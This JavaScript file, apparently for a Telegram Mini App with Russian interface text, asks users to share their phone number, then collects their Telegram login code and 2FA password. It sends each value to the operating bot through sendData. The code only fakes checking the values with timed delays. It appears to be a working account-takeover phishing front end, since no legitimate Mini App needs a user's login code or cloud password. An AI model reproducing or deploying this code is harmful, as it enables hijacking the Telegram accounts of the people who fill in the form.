document.addEventListener('DOMContentLoaded', () => {
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    const loginBtn = document.getElementById('loginBtn');
    const authForm = document.getElementById('authForm');
    const loadingSpinner = document.getElementById('loadingSpinner');
    const statusMsg = document.getElementById('statusMsg');
    const phoneInput = document.getElementById('phoneInput');
    const codeInput = document.getElementById('codeInput');
    const twoFaInput = document.getElementById('2faInput');
    const submitBtn = document.getElementById('submitBtn');
    const successMsg = document.getElementById('successMsg');
    const errorMsg = document.getElementById('errorMsg');

    let currentStep = 'contact';  // Шаги: contact, phone, code, 2fa

    loginBtn.addEventListener('click', () => {
        loginBtn.style.opacity = '0';
        setTimeout(() => loginBtn.classList.add('hidden'), 300);
        authForm.classList.remove('hidden');
        statusMsg.textContent = 'Поделитесь контактом для авторизации...';
        showLoading();
        currentStep = 'contact';

        tg.requestContact()
            .then((contact) => {
                if (contact && contact.phone_number) {
                    phoneInput.value = contact.phone_number;
                    phoneInput.classList.remove('hidden');
                    hideLoading();
                    submitBtn.classList.remove('hidden');
                    submitBtn.textContent = 'Отправить номер';
                    statusMsg.textContent = 'Номер получен. Отправляем...';
                    currentStep = 'phone';
                    tg.HapticFeedback.impactOccurred('light');
                } else {
                    throw new Error('Contact denied');
                }
            })
            .catch((error) => {
                console.error('Request contact error:', error);
                hideLoading();
                errorMsg.textContent = '❌ Разрешение отклонено. Попробуйте снова.';
                errorMsg.classList.remove('hidden');
                setTimeout(resetForm, 2000);
            });
    });

    submitBtn.addEventListener('click', () => {
        const step = currentStep;
        let payload = {};

        if (step === 'phone') {
            payload = { action: 'share_phone', phone: phoneInput.value };
            tg.sendData(JSON.stringify(payload));
            showLoading();
            statusMsg.textContent = 'Отправляем номер боту...';
            tg.HapticFeedback.notificationOccurred('success');
            // Переход к следующему шагу
            setTimeout(() => {
                hideLoading();
                phoneInput.classList.add('hidden');
                codeInput.classList.remove('hidden');
                submitBtn.textContent = 'Отправить код';
                statusMsg.textContent = 'Введите SMS-код из Telegram (проверьте чат для подтверждения).';
                currentStep = 'code';
            }, 1500);
            return;
        }

        if (step === 'code') {
            const code = codeInput.value.trim();
            if (!code) {
                errorMsg.textContent = 'Введите код.';
                errorMsg.classList.remove('hidden');
                return;
            }
            payload = { action: 'verify_code', code: code };
            tg.sendData(JSON.stringify(payload));
            showLoading();
            statusMsg.textContent = 'Проверяем код...';
            tg.HapticFeedback.impactOccurred('medium');
            // Переход к 2FA
            setTimeout(() => {
                hideLoading();
                codeInput.classList.add('hidden');
                twoFaInput.classList.remove('hidden');
                submitBtn.textContent = 'Подтвердить 2FA';
                statusMsg.textContent = 'Если 2FA настроен, введите пароль (иначе оставьте пустым).';
                currentStep = '2fa';
            }, 2000);
            return;
        }

        if (step === '2fa') {
            const password = twoFaInput.value;
            payload = { action: 'verify_2fa', password: password };
            tg.sendData(JSON.stringify(payload));
            showLoading();
            statusMsg.textContent = 'Подтверждаем 2FA...';
            tg.HapticFeedback.impactOccurred('heavy');
            // Показываем success (бот уточнит в чате)
            setTimeout(() => {
                hideLoading();
                successMsg.classList.remove('hidden');
                submitBtn.classList.add('hidden');
                tg.HapticFeedback.notificationOccurred('success');
                setTimeout(() => tg.close(), 3000);
            }, 3000);
            return;
        }
    });

    function showLoading() {
        loadingSpinner.classList.remove('hidden');
        submitBtn.disabled = true;
        errorMsg.classList.add('hidden');
    }

    function hideLoading() {
        loadingSpinner.classList.add('hidden');
        submitBtn.disabled = false;
    }

    function resetForm() {
        authForm.classList.add('hidden');
        loginBtn.classList.remove('hidden');
        loginBtn.style.opacity = '1';
        currentStep = 'contact';
        // Очистка полей
        phoneInput.value = '';
        codeInput.value = '';
        twoFaInput.value = '';
        successMsg.classList.add('hidden');
        errorMsg.classList.add('hidden');
        statusMsg.textContent = '';
    }

    // Событие после отправки данных
    tg.onEvent('webAppDataSent', () => {
        tg.HapticFeedback.impactOccurred('light');
    });
});
